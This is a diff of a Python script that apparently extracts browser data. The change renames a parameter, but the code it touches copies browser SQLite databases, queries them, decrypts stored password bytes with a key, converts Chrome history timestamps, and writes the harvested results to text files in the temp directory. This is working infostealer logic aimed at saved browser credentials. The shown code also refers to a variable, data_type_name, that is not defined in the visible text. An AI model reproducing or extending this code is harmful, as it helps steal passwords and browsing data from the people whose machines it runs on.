@@ -92,16 +92,16 @@ def decrypt_password(buff: bytes, key: bytes) -> str:
     return decrypted_pass
 
 
-def save_results(browser_name, type_of_data, content):
+def save_results(browser_name, data_type, content):
     if content is not None:
         temp_dir = tempfile.gettempdir()
-        file_path = os.path.join(temp_dir, f"{browser_name}-{type_of_data}.txt")
+        file_path = os.path.join(temp_dir, f"{browser_name}-{data_type}.txt")
 
         # Check if the file already exists
         if not os.path.exists(file_path):
             with open(file_path, 'w', encoding="utf-8") as file:
                 file.write(content)
-            print(f"[+] '{type_of_data}' saved in {file_path}")
+            print(f"[+] '{data_type}' saved in {file_path}")
         else:
             # Check if the content is not already present in the file
             with open(file_path, 'r', encoding="utf-8") as file:
@@ -110,13 +110,13 @@ def save_results(browser_name, type_of_data, content):
             if content not in existing_content:
                 with open(file_path, 'a', encoding="utf-8") as file:
                     file.write(content)
-                print(f"[+] '{type_of_data}' appended to '{file_path}'")
+                print(f"[+] '{data_type}' appended to '{file_path}'")
             else:
-                print(f"[-] '{type_of_data}' already exists in '{file_path}'")
+                print(f"[-] '{data_type}' already exists in '{file_path}'")
 
 
-def get_data(path: str, profile: str, key, type_of_data):
-    db_file = f'{path}\\{profile}{type_of_data["file"]}'
+def get_data(path: str, profile: str, key, data_type):
+    db_file = f'{path}\\{profile}{data_type["file"]}'
     if not os.path.exists(db_file):
         return
 
@@ -124,21 +124,22 @@ def get_data(path: str, profile: str, key, type_of_data):
     shutil.copy(db_file, 'temp_db')
     conn = sqlite3.connect('temp_db')
     cursor = conn.cursor()
-    cursor.execute(type_of_data['query'])
+    cursor.execute(data_type['query'])
 
     for row in cursor.fetchall():
         row = list(row)
-        if type_of_data['decrypt']:
+        if data_type['decrypt']:
             for i in range(len(row)):
                 if isinstance(row[i], bytes):
                     row[i] = decrypt_password(row[i], key)
+
         if data_type_name == 'history':
             if row[2] != 0:
                 row[2] = convert_chrome_time(row[2])
             else:
                 row[2] = "0"
 
-        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+        result += "\n".join([f"{col}: {val}" for col, val in zip(data_type['columns'], row)]) + "\n\n"
 
     conn.close()
     os.remove('temp_db')
